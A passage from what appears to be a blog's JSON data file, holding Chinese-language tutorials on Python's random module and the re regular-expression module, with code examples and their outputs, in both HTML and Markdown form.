class=\"number\">10</span>,<span class=\"number\">30</span>,<span class=\"number\">2</span>))</span><br></pre></td></tr></table></figure>\n\n<p> 5.random.choice(sequence)</p>\n<p>#random.choice从序列中获取一个随机元素。其函数原型为：random.choice(sequence)。</p>\n<p>参数sequence表示一个有序类型。这里要说明 一下：sequence在python不是一种特定的类型，而是泛指一系列的类型。list, tuple, 字符串都属于sequence。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span> <span class=\"keyword\">import</span> random  </span><br><span class=\"line\"><span class=\"number\">2</span> lst = [<span class=\"string\">&#x27;python&#x27;</span>,<span class=\"string\">&#x27;C&#x27;</span>,<span class=\"string\">&#x27;C++&#x27;</span>,<span class=\"string\">&#x27;javascript&#x27;</span>]  </span><br><span class=\"line\"><span class=\"number\">3</span> str1 = (<span class=\"string\">&#x27;I love python&#x27;</span>)  </span><br><span class=\"line\"><span class=\"number\">4</span> <span class=\"built_in\">print</span>(random.choice(lst))</span><br><span class=\"line\"><span class=\"number\">5</span> <span class=\"built_in\">print</span>(random.choice(str1))  </span><br></pre></td></tr></table></figure>\n\n<p>6.random.shuffle(x[, random])</p>\n<p>#用于将一个列表中的元素打乱,即将列表内的元素随机排列。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span> <span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"number\">2</span> p = [<span class=\"string\">&#x27;A&#x27;</span> , <span class=\"string\">&#x27;B&#x27;</span>, <span class=\"string\">&#x27;C&#x27;</span>, <span class=\"string\">&#x27;D&#x27;</span>, <span class=\"string\">&#x27;E&#x27;</span> ]</span><br><span class=\"line\"><span class=\"number\">3</span> random.shuffle(p)  </span><br><span class=\"line\"><span class=\"number\">4</span> <span class=\"built_in\">print</span> (p)  </span><br></pre></td></tr></table></figure>\n\n<p>7.random.sample(sequence, k)</p>\n<p>#从指定序列中随机获取指定长度的片断并随机排列。注意：sample函数不会修改原有序列。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span> <span class=\"keyword\">import</span> random   </span><br><span class=\"line\"><span class=\"number\">2</span> lst = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>]  </span><br><span class=\"line\"><span class=\"number\">3</span> <span class=\"built_in\">print</span>(random.sample(lst,<span class=\"number\">4</span>))  </span><br><span class=\"line\"><span class=\"number\">4</span> <span class=\"built_in\">print</span>(lst) </span><br></pre></td></tr></table></figure>\n\n\n\n"},{"title":"每日学说话(●'◡'●)python-re","_content":"## python\n\n### 基础\n\n``` bash\n方法、属性、迭代器、生成器、异常、类和对象、函数、字典、列表、元组、字符串、条件循环等其他语句；\n```\n\n开始进阶@O(∩_∩)O@\n\n### 正则表达式-元字符\n\n![image-20210623212648037](C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210623212648037.png)\n\n### 正则表达式-重复\n\n![image-20210623213058621](C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210623213058621.png)\n\n### 正则表达式-反义\n\n![image-20210623214030452](C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210623214030452.png)\n\n\n\n### re模块-match方法\n\nre.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。\n\n``` python\nre.match(pattern, string, flags=0)   #函数语法\n```\n\n函数参数说明：\n\n|  参数   |                             描述                             |\n| :-----: | :----------------------------------------------------------: |\n| pattern |                       匹配的正则表达式                       |\n| string  |                        要匹配的字符串                        |\n|  flags  | 标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。 |\n\n匹配成功re.match方法返回一个匹配的对象，否则返回None。\n\n我们可以使用group(num) 或  groups() 匹配对象函数来获取匹配表达式。\n\n| 匹配对象方法 |                             描述                             |\n| :----------: | :----------------------------------------------------------: |\n| group(num=0) | 匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组 |\n|   groups()   |    返回一个包含所有小组字符串的元组，从 1 到 所含的小组号    |\n\n实例：\n\n```python\n#!/usr/bin/python\n# -*- coding: UTF-8 -*- \n import re\nprint(re.match('www', 'www.fbc123.com').span())  # 在起始位置匹配\nprint(re.match('com', 'www.fbc123.com'))         # 不在起始位置匹配\n```\n\n以上实例运行输出结果为：\n\n```\n(0, 3)\nNone\n```\n\n实例：\n\n```python\n\n#!/usr/bin/python\nimport re\n \nline = \"Cats are smarter than dogs\"\n \nmatchObj = re.match( r'(.*) are (.*?) .*', line, re.M|re.I)\n \nif matchObj:\n   print \"matchObj.group() : \", matchObj.group()\n   print \"matchObj.group(1) : \", matchObj.group(1)\n   print \"matchObj.group(2) : \", matchObj.group(2)\nelse:\n   print \"No match!!\"\n```\n\n以上实例执行结果如下：\n\n```\nmatchObj.group() :  Cats are smarter than dogs\nmatchObj.group(1) :  Cats\nmatchObj.group(2) :  smarter\n```\n\n### re模块-search方法\n\nre.search 扫描整个字符串并返回第一个成功的匹配。\n\n函数语法：\n\n```\nre.search(pattern, string, flags=0)\n```\n\n函数参数说明：\n\n| 参数    |                             描述                             |\n| ------- | :----------------------------------------------------------: |\n| pattern |                       匹配的正则表达式                       |\n| string  |                        要匹配的字符串                        |\n| flags   | 标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等 |\n\n匹配成功re.search方法返回一个匹配的对象，否则返回None。\n\n我们可以使用group(num) 或  groups() 匹配对象函数来获取匹配表达式\n\n| 匹配对象方法 | 描述                                                         |\n| ------------ | ------------------------------------------------------------ |\n| group(num=0) | 匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。 |\n| groups()     | 返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。     |\n\n```python\n#!/usr/bin/python\n# -*- coding: UTF-8 -*-  \nimport re\nprint(re.search('www', 'www.fbc123.com').span())  # 在起始位置匹配\nprint(re.search('com', 'www.fbc123.com').span())  # 不在起始位置匹配\n```\n\n以上实例运行输出结果为：\n\n```\n(0, 3)\n(11, 14)\n```\n\n实例：\n\n```python\n\n#!/usr/bin/python\nimport re\n \nline = \"Cats are smarter than dogs\";\n \nsearchObj = re.search( r'(.*) are (.*?) .*', line, re.M|re.I)\n \nif searchObj:\n   print \"searchObj.group() : \", searchObj.group()\n   print \"searchObj.group(1) : \", searchObj.group(1)\n   print \"searchObj.group(2) : \", searchObj.group(2)\nelse:\n   print \"Nothing found!!\"\n```\n\n以上实例执行结果如下：\n\n```\nsearchObj.group() :  Cats are smarter than dogs\nsearchObj.group(1) :  Cats\nsearchObj.group(2) :  smarter\n```\n\n### re.match与re.search的区别\n\nre.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。\n\n实例：\n\n```python\n#!/usr/bin/python\nimport re\n \nline = \"Cats are smarter than dogs\";\n \nmatchObj = re.match( r'dogs', line, re.M|re.I)\nif matchObj:\n   print \"match --> matchObj.group() : \", matchObj.group()\nelse:\n   print \"No match!!\"\n \nmatchObj = re.search( r'dogs', line, re.M|re.I)\nif matchObj:\n   print \"search --> searchObj.group() : \", matchObj.group()\nelse:\n   print \"No match!!\"\n```\n\n以上实例运行结果如下：\n\n```\nNo match!!\nsearch --> searchObj.group() :  dogs\n```\n\n### 检索和替换\n\nPython 的 re 模块提供了re.sub用于替换字符串中的匹配项。\n\n语法：\n\n```python\nre.sub(pattern, repl, string, count=0, flags=0)\n```\n\n参数：\n\n- pattern : 正则中的模式字符串。\n- repl : 替换的字符串，也可为一个函数。\n- string : 要被查找替换的原始字符串。\n- count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。\n\n实例：\n\n```python\n#!/usr/bin/python\n# -*- coding: UTF-8 -*-\n \nimport re\n \nphone = \"2004-959-559 # 这是一个国外电话号码\"\n \n# 删除字符串中的 Python注释 \nnum = re.sub(r'#.*$', \"\", phone)\nprint \"电话号码是: \", num\n \n# 删除非数字(-)的字符串 \nnum = re.sub(r'\\D', \"\", phone)\nprint \"电话号码是 : \", num\n```\n\n以上实例执行结果如下：\n\n```\n电话号码是:  2004-959-559 \n电话号码是 :  2004959559\n```\n\n### repl 参数是一个函数\n\n以下实例中将字符串中的匹配的数字乘以 2：\n\n```python\n\n#!/usr/bin/python\n# -*- coding: UTF-8 -*-\n \nimport re\n \n# 将匹配的数字乘以 2\ndef double(matched):\n    value = int(matched.group('value'))\n    return str(value * 2)\n \ns = 'A23G4HFD567'\nprint(re.sub('(?P<value>\\d+)', double, s))\n```\n\n执行输出结果为：\n\n```\nA46G8HFD1134\n```\n\n### re模块-compile方法\n\ncompile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。\n\n语法格式为：\n\n```\nre.compile(pattern[, flags])\n```\n\n参数：\n\n- pattern : 一个字符串形式的正则表达式\n\n- flags : 可选，表示匹配模式，比如忽略大小写，多行模式等，具体参数为：\n\n  1. **re.I** 忽略大小写\n\n  2. **re.L** 表示特殊字符集 \\w, \\W, \\b, \\B, \\s, \\S 依赖于当前环境\n\n  3. **re.M** 多行模式\n\n  4. **re.S** 即为 . 并且包括换行符在内的任意字符（. 不包括换行符）\n\n  5. **re.U** 表示特殊字符集 \\w, \\W, \\b, \\B, \\d, \\D, \\s, \\S 依赖于 Unicode 字符属性数据库\n\n  6. **re.X** 为了增加可读性，忽略空格和 # 后面的注释\n\n实例：\n\n```python\n>>>import re\n>>> pattern = re.compile(r'\\d+')                    # 用于匹配至少一个数字\n>>> m = pattern.match('one12twothree34four')        # 查找头部，没有匹配\n>>> print m\nNone\n>>> m = pattern.match('one12twothree34four', 2, 10) # 从'e'的位置开始匹配，没有匹配\n>>> print m\nNone\n>>> m = pattern.match('one12twothree34four', 3, 10) # 从'1'的位置开始匹配，正好匹配\n>>> print m                                         # 返回一个 Match 对象\n<_sre.SRE_Match object at 0x10a42aac0>\n>>> m.group(0)   # 可省略 0\n'12'\n>>> m.start(0)   # 可省略 0\n3\n>>> m.end(0)     # 可省略 0\n5\n>>> m.span(0)    # 可省略 0\n(3, 5)\n```\n\n在上面，当匹配成功时返回一个 Match 对象，其中：\n\n- `group([group1, …])` 方法用于获得一个或多个分组匹配的字符串，当要获得整个匹配的子串时，可直接使用 `group()` 或 `group(0)`；\n- `start([group])` 方法用于获取分组匹配的子串在整个字符串中的起始位置（子串第一个字符的索引），参数默认值为 0；\n- `end([group])` 方法用于获取分组匹配的子串在整个字符串中的结束位置（子串最后一个字符的索引+1），参数默认值为 0；\n- `span([group])` 方法返回 `(start(group), end(group))`。\n\n再看看一个例子：\n\n```python\n\n>>>import re\n>>> pattern = re.compile(r'([a-z]+) ([a-z]+)', re.I)   # re.I 表示忽略大小写\n>>> m = pattern.match('Hello World Wide Web')\n>>> print m                               # 匹配成功，返回一个 Match 对象\n<_sre.SRE_Match object at 0x10bea83e8>\n>>> m.group(0)                            # 返回匹配成功的整个子串\n'Hello World'\n>>> m.span(0)                             # 返回匹配成功的整个子串的索引\n(0, 11)\n>>> m.group(1)                            # 返回第一个分组匹配成功的子串\n'Hello'\n>>> m.span(1)                             # 返回第一个分组匹配成功的子串的索引\n(0, 5)\n>>> m.group(2)                            # 返回第二个分组匹配成功的子串\n'World'\n>>> m.span(2)                             # 返回第二个分组匹配成功的子串\n(6, 11)\n>>> m.groups()                            # 等价于 (m.group(1), m.group(2), ...)\n('Hello', 'World')\n>>> m.group(3)                            # 不存在第三个分组\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nIndexError: no such group\n\n```\n\n### re模块-findall方法\n\n在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。\n\nmatch 和 search  是匹配一次 findall 匹配所有。\n\n语法格式为：\n\n```\nfindall(string[, pos[, endpos]])\n```\n\n参数：\n\n- string : 待匹配的字符串。\n- pos : 可选参数，指定字符串的起始位置，默认为 0。\n- endpos : 可选参数，指定字符串的结束位置，默认为字符串的长度。\n\n查找字符串中的所有数字：\n\n```python\n\n# -*- coding:UTF8 -*-\n \nimport re\n \npattern = re.compile(r'\\d+')   # 查找数字\nresult1 = pattern.findall('runoob 123 google 456')\nresult2 = pattern.findall('run88oob123google456', 0, 10)\n \nprint(result1)\nprint(result2)\n\n```\n\n输出结果：\n\n```\n['123', '456']\n['88', '12']\n```\n\n### re模块-finditer方法\n\n和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。\n\n```\nre.finditer(pattern, string, flags=0)\n```\n\n```\n\n# -*- coding: UTF-8 -*-\n \nimport re\n \nit = re.finditer(r\"\\d+\",\"12a32bc43jf3\") \nfor match in it: \n    print (match.group() )\n\n```\n\n输出结果：\n\n```\n12 \n32 \n43 \n3\n```\n\n### re模块-split方法\n\nsplit 方法按照能够匹配的子串将字符串分割后返回列表，它的使用形式如下：\n\n```\nre.split(pattern, string[, maxsplit=0, flags=0])\n```\n\n```python\n\n>>>import re\n>>> re.split('\\W+', 'runoob, runoob, runoob.')\n['runoob', 'runoob', 'runoob', '']\n>>> re.split('(\\W+)', ' runoob, runoob, runoob.') \n['', ' ', 'runoob', ', ', 'runoob', ', ', 'runoob', '.', '']\n>>> re.split('\\W+', ' runoob, runoob, runoob.', 1) \n['', 'runoob, runoob, runoob.']\n \n>>> re.split('a*', 'hello world')   # 对于一个找不到匹配的字符串而言，split 不会对其作出分割\n['hello world']\n\n```\n\n| 参数     | 描述                                                         |\n| -------- | ------------------------------------------------------------ |\n| pattern  | 匹配的正则表达式                                             |\n| string   | 要匹配的字符串。                                             |\n| maxsplit | 分隔次数，maxsplit=1 分隔一次，默认为 0，不限制次数。        |\n| flags    | 标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。 |\n\n## 正则表达式对象\n\n### re.RegexObject\n\nre.compile() 返回 RegexObject 对象。\n\n### re.MatchObject\n\ngroup() 返回被 RE 匹配的字符串。\n\n- start() 返回匹配开始的位置\n- end() 返回匹配结束的位置\n- span() 返回一个元组包含匹配 (开始,结束) 的位置\n\n------\n\n## 正则表达式修饰符 - 可选标志\n\n正则表达式可以包含一些可选标志修饰符来控制匹配的模式。修饰符被指定为一个可选的标志。多个标志可以通过按位 OR(|) 它们来指定。如 re.I | re.M 被设置成 I 和 M 标志：\n\n| 修饰符 | 描述                                                         |\n| ------ | ------------------------------------------------------------ |\n| re.I   | 使匹配对大小写不敏感                                         |\n| re.L   | 做本地化识别（locale-aware）匹配                             |\n| re.M   | 多行匹配，影响 ^ 和 $                                        |\n| re.S   | 使 . 匹配包括换行在内的所有字符                              |\n| re.U   | 根据Unicode字符集解析字符。这个标志影响 \\w, \\W, \\b, \\B.      |\n| re.X   | 该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。 |\n\n------\n\n## 正则表达式模式\n\n模式字符串使用特殊的语法来表示一个正则表达式：\n\n字母和数字表示他们自身。一个正则表达式模式中的字母和数字匹配同样的字符串。\n\n多数字母和数字前加一个反斜杠时会拥有不同的含义。\n\n标点符号只有被转义时才匹配自身，否则它们表示特殊的含义。\n\n反斜杠本身需要使用反斜杠转义。\n\n由于正则表达式通常都包含反斜杠，所以你最好使用原始字符串来表示它们。模式元素(如 r'\\t'，等价于 '\\\\t')匹配相应的特殊字符。\n\n下表列出了正则表达式模式语法中的特殊元素。如果你使用模式的同时提供了可选的标志参数，某些模式元素的含义会改变。\n\n| 模式        | 描述                                                         |\n| ----------- | ------------------------------------------------------------ |\n| ^           | 匹配字符串的开头                                             |\n| $           | 匹配字符串的末尾。                                           |\n| .           | 匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。 |\n| [...]       | 用来表示一组字符,单独列出：[amk] 匹配 'a'，'m'或'k'          |\n| [^...]      | 不在[]中的字符：[^abc] 匹配除了a,b,c之外的字符。             |\n| re*         | 匹配0个或多个的表达式。                                      |\n| re+         | 匹配1个或多个的表达式。                                      |\n| re?         | 匹配0个或1个由前面的正则表达式定义的片段，非贪婪方式         |\n| re{ n}      | 精确匹配 n 个前面表达式。例如， o{2} 不能匹配 \"Bob\" 中的 \"o\"，但是能匹配 \"food\" 中的两个 o。 |\n| re{ n,}     | 匹配 n 个前面表达式。例如， o{2,} 不能匹配\"Bob\"中的\"o\"，但能匹配 \"foooood\"中的所有 o。\"o{1,}\" 等价于 \"o+\"。\"o{0,}\" 则等价于 \"o*\"。 |\n| re{ n, m}   | 匹配 n 到 m 次由前面的正则表达式定义的片段，贪婪方式         |\n| a\\| b       | 匹配a或b                                                     |\n| (re)        | 对正则表达式分组并记住匹配的文本                             |\n| (?imx)      | 正则表达式包含三种可选标志：i, m, 或 x 。只影响括号中的区域。 |\n| (?-imx)     | 正则表达式关闭 i, m, 或 x 可选标志。只影响括号中的区域。     |\n| (?: re)     | 类似 (...), 但是不表示一个组                                 |\n| (?imx: re)  | 在括号中使用i, m, 或 x 可选标志                              |\n| (?-imx: re) | 在括号中不使用i, m, 或 x 可选标志                            |\n| (?#...)     | 注释.                                                        |\n| (?= re)     | 前向肯定界定符。如果所含正则表达式，以 ... 表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边。 |\n| (?! re)     | 前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功 |\n| (?> re)     | 匹配的独立模式，省去回溯。                                   |\n| \\w          | 匹配字母数字及下划线                                         |\n| \\W          | 匹配非字母数字及下划线                                       |\n| \\s          | 匹配任意空白字符，等价于 [ \\t\\n\\r\\f]。                       |\n| \\S          | 匹配任意非空字符                                             |\n| \\d          | 匹配任意数字，等价于 [0-9].                                  |\n| \\D          | 匹配任意非数字                                               |\n| \\A          | 匹配字符串开始                                               |\n| \\Z          | 匹配字符串结束，如果是存在换行，只匹配到换行前的结束字符串。 |\n| \\z          | 匹配字符串结束                                               |\n| \\G          | 匹配最后匹配完成的位置。                                     |\n| \\b          | 匹配一个单词边界，也就是指单词和空格间的位置。例如， 'er\\b' 可以匹配\"never\" 中的 'er'，但不能匹配 \"verb\" 中的 'er'。 |\n| \\B          | 匹配非单词边界。'er\\B' 能匹配 \"verb\" 中的 'er'，但不能匹配 \"never\" 中的 'er'。 |\n| \\n, \\t, 等. | 匹配一个换行符。匹配一个制表符。等                           |\n| \\1...\\9     | 匹配第n个分组的内容。                                        |\n| \\10         | 匹配第n个分组的内容，如果它经匹配。否则指的是八进制字符码的表达式。 |\n\n------\n\n## 正则表达式实例\n\n#### 字符匹配\n\n| 实例   | 描述           |\n| ------ | -------------- |\n| python | 匹配 \"python\". |\n\n#### 字符类\n\n| 实例        | 描述                              |\n| ----------- | --------------------------------- |\n| [Pp]ython   | 匹配 \"Python\" 或 \"python\"         |\n| rub[ye]     | 匹配 \"ruby\" 或 \"rube\"             |\n| [aeiou]     | 匹配中括号内的任意一个字母        |\n| [0-9]       | 匹配任何数字。类似于 [0123456789] |\n| [a-z]       | 匹配任何小写字母                  |\n| [A-Z]       | 匹配任何大写字母                  |\n| [a-zA-Z0-9] | 匹配任何字母及数字                |\n| [^aeiou]    | 除了aeiou字母以外的所有字符       |\n| [^0-9]      | 匹配除了数字外的字符              |\n\n#### 特殊字符类\n\n| 实例 | 描述                                                         |\n| ---- | ------------------------------------------------------------ |\n| .    | 匹配除 \"\\n\" 之外的任何单个字符。要匹配包括 '\\n' 在内的任何字符，请使用象 '[.\\n]' 的模式。 |\n| \\d   | 匹配一个数字字符。等价于 [0-9]。                             |\n| \\D   | 匹配一个非数字字符。等价于 [^0-9]。                          |\n| \\s   | 匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \\f\\n\\r\\t\\v]。 |\n| \\S   | 匹配任何非空白字符。等价于 [^ \\f\\n\\r\\t\\v]。                  |\n| \\w   | 匹配包括下划线的任何单词字符。等价于'[A-Za-z0-9_]'。         |\n| \\W   | 匹配任何非单词字符。等价于 '[^A-Za-z0-9_]'。                 |\n\nw(ﾟДﾟ)w！！！！！！！！\n\n常用正则表达式：\n\n```\nEmail: '[0-9a-zA-Z]+@[0-9a-zA-Z]+\\.[a-zA-Z]{2,3}'\nIp地址: (ipv4)：'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}'\nWeb地址: 'https?:/{2}\\w.+'\n```\n\n","source":"_posts/py正则表达式.md","raw":"---\ntitle: 每日学说话(●'◡'●)python-re\n---\n## python\n\n### 基础\n\n``` bash\n方法、属性、迭代器、生成器、异常、类和对象、函数、字典、列表、元组、字符串、条件循环等其他语句；\n```\n\n开始进阶@O(∩_∩)O@\n\n### 正则表达式-元字符\n\n![image-20210623212648037](C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210623212648037.png)\n\n### 正则表达式-重复\n\n![image-20210623213058621](C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210623213058621.png)\n\n### 正则表达式-反义\n\n![image-20210623214030452](C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210623214030452.png)\n\n\n\n### re模块-match方法\n\nre.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。\n\n``` python\nre.match(pattern, string, flags=0)   #函数语法\n```\n\n函数参数说明：\n\n|  参数   |                             描述                             |\n| :-----: | :----------------------------------------------------------: |\n| pattern |                       匹配的正则表达式                       |\n| string  |                        要匹配的字符串                        |\n|  flags  | 标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。 |\n\n匹配成功re.match方法返回一个匹配的对象，否则返回None。\n\n我们可以使用group(num) 或  groups() 匹配对象函数来获取匹配表达式。\n\n| 匹配对象方法 |                             描述                             |\n| :----------: | :----------------------------------------------------------: |\n| group(num=0) | 匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组 |\n|   groups()   |    返回一个包含所有小组字符串的元组，从 1 到 所含的小组号    |\n\n实例：\n\n```python\n#!/usr/bin/python\n# -*- coding: UTF-8 -*- \n import re\nprint(re.match('www', 'www.fbc123.com').span())  # 在起始位置匹配\nprint(re.match('com', 'www.fbc123.com'))         # 不在起始位置匹配\n```\n\n以上实例运行输出结果为：\n\n```\n(0, 3)\nNone\n```\n\n实例：\n\n```python\n\n#!/usr/bin/python\nimport re\n \nline = \"Cats are smarter than dogs\"\n \nmatchObj = re.match( r'(.*) are (.*?) .*', line, re.M|re.I)\n \nif matchObj:\n   print \"matchObj.group() : \", matchObj.group()\n   print \"matchObj.group(1) : \", matchObj.group(1)\n   print \"matchObj.group(2) : \", matchObj.group(2)\nelse:\n   print \"No match!!\"\n```\n\n以上实例执行结果如下：\n\n```\nmatchObj.group() :  Cats are smarter than dogs\nmatchObj.group(1) :  Cats\nmatchObj.group(2) :  smarter\n```\n\n### re模块-search方法\n\nre.search 扫描整个字符串并返回第一个成功的匹配。\n\n函数语法：\n\n```\nre.search(pattern, string, flags=0)\n```\n\n函数参数说明：\n\n| 参数    |                             描述                             |\n| ------- | :----------------------------------------------------------: |\n| pattern |                       匹配的正则表达式                       |\n| string  |                        要匹配的字符串                        |\n| flags   | 标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等 |\n\n匹配成功re.search方法返回一个匹配的对象，否则返回None。\n\n我们可以使用group(num) 或  groups() 匹配对象函数来获取匹配表达式\n\n| 匹配对象方法 | 描述                                                         |\n| ------------ | ------------------------------------------------------------ |\n| group(num=0) | 匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。 |\n| groups()     | 返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。     |\n\n```python\n#!/usr/bin/python\n# -*- coding: UTF-8 -*-  \nimport re\nprint(re.search('www', 'www.fbc123.com').span())  # 在起始位置匹配\nprint(re.search('com', 'www.fbc123.com').span())  # 不在起始位置匹配\n```\n\n以上实例运行输出结果为：\n\n```\n(0, 3)\n(11, 14)\n```\n\n实例：\n\n```python\n\n#!/usr/bin/python\nimport re\n \nline = \"Cats are smarter than dogs\";\n \nsearchObj = re.search( r'(.*) are (.*?) .*', line, re.M|re.I)\n \nif searchObj:\n   print \"searchObj.group() : \", searchObj.group()\n   print \"searchObj.group(1) : \", searchObj.group(1)\n   print \"searchObj.group(2) : \", searchObj.group(2)\nelse:\n   print \"Nothing found!!\"\n```\n\n以上实例执行结果如下：\n\n```\nsearchObj.group() :  Cats are smarter than dogs\nsearchObj.group(1) :  Cats\nsearchObj.group(2) :  smarter\n```\n\n### re.match与re.search的区别\n\nre.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。\n\n实例：\n\n```python\n#!/usr/bin/python\nimport re\n \nline = \"Cats are smarter than dogs\";\n \nmatchObj = re.match( r'dogs', line, re.M|re.I)\nif matchObj:\n   print \"match --> matchObj.group() : \", matchObj.group()\nelse:\n   print \"No match!!\"\n \nmatchObj = re.search( r'dogs', line, re.M|re.I)\nif matchObj:\n   print \"search --> searchObj.group() : \", matchObj.group()\nelse:\n   print \"No match!!\"\n```\n\n以上实例运行结果如下：\n\n```\nNo match!!\nsearch --> searchObj.group() :  dogs\n```\n\n### 检索和替换\n\nPython 的 re 模块提供了re.sub用于替换字符串中的匹配项。\n\n语法：\n\n```python\nre.sub(pattern, repl, string, count=0, flags=0)\n```\n\n参数：\n\n- pattern : 正则中的模式字符串。\n- repl : 替换的字符串，也可为一个函数。\n- string : 要被查找替换的原始字符串。\n- count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。\n\n实例：\n\n```python\n#!/usr/bin/python\n# -*- coding: UTF-8 -*-\n \nimport re\n \nphone = \"2004-959-559 # 这是一个国外电话号码\"\n \n# 删除字符串中的 Python注释 \nnum = re.sub(r'#.*$', \"\", phone)\nprint \"电话号码是: \", num\n \n# 删除非数字(-)的字符串 \nnum = re.sub(r'\\D', \"\", phone)\nprint \"电话号码是 : \", num\n```\n\n以上实例执行结果如下：\n\n```\n电话号码是:  2004-959-559 \n电话号码是 :  2004959559\n```\n\n### repl 参数是一个函数\n\n以下实例中将字符串中的匹配的数字乘以 2：\n\n```python\n\n#!/usr/bin/python\n# -*- coding: UTF-8 -*-\n \nimport re\n \n# 将匹配的数字乘以 2\ndef double(matched):\n    value = int(matched.group('value'))\n    return str(value * 2)\n \ns = 'A23G4HFD567'\nprint(re.sub('(?P<value>\\d+)', double, s))\n```\n\n执行输出结果为：\n\n```\nA46G8HFD1134\n```\n\n### re模块-compile方法\n\ncompile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。\n\n语法格式为：\n\n```\nre.compile(pattern[, flags])\n```\n\n参数：\n\n- pattern : 一个字符串形式的正则表达式\n\n- flags : 可选，表示匹配模式，比如忽略大小写，多行模式等，具体参数为：\n\n  1. **re.I** 忽略大小写\n\n  2. **re.L** 表示特殊字符集 \\w, \\W, \\b, \\B, \\s, \\S 依赖于当前环境\n\n  3. **re.M** 多行模式\n\n  4. **re.S** 即为 . 并且包括换行符在内的任意字符（. 不包括换行符）\n\n  5. **re.U** 表示特殊字符集 \\w, \\W, \\b, \\B, \\d, \\D, \\s, \\S 依赖于 Unicode 字符属性数据库\n\n  6. **re.X** 为了增加可读性，忽略空格和 # 后面的注释\n\n实例：\n\n```python\n>>>import re\n>>> pattern = re.compile(r'\\d+')                    # 用于匹配至少一个数字\n>>> m = pattern.match('one12twothree34four')        # 查找头部，没有匹配\n>>> print m\nNone\n>>> m = pattern.match('one12twothree34four', 2, 10) # 从'e'的位置开始匹配，没有匹配\n>>> print m\nNone\n>>> m = pattern.match('one12twothree34four', 3, 10) # 从'1'的位置开始匹配，正好匹配\n>>> print m                                         # 返回一个 Match 对象\n<_sre.SRE_Match object at 0x10a42aac0>\n>>> m.group(0)   # 可省略 0\n'12'\n>>> m.start(0)   # 可省略 0\n3\n>>> m.end(0)     # 可省略 0\n5\n>>> m.span(0)    # 可省略 0\n(3, 5)\n```\n\n在上面，当匹配成功时返回一个 Match 对象，其中：\n\n- `group([group1, …])` 方法用于获得一个或多个分组匹配的字符串，当要获得整个匹配的子串时，可直接使用 `group()` 或 `group(0)`；\n- `start([group])` 方法用于获取分组匹配的子串在整个字符串中的起始位置（子串第一个字符的索引），参数默认值为 0；\n- `end([group])` 方法用于获取分组匹配的子串在整个字符串中的结束位置（子串最后一个字符的索引+1），参数默认值为 0；\n- `span([group])` 方法返回 `(start(group), end(group))`。\n\n再看看一个例子：\n\n```python\n\n>>>import re\n>>> pattern = re.compile(r'([a-z]+) ([a-z]+)', re.I)   # re.I 表示忽略大小写\n>>> m = pattern.match('Hello World Wide Web')\n>>> print m                               # 匹配成功，返回一个 Match 对象\n<_sre.SRE_Match object at 0x10bea83e8>\n>>> m.group(0)                            # 返回匹配成功的整个子串\n'Hello World'\n>>> m.span(0)                             # 返回匹配成功的整个子串的索引\n(0, 11)\n>>> m.group(1)                            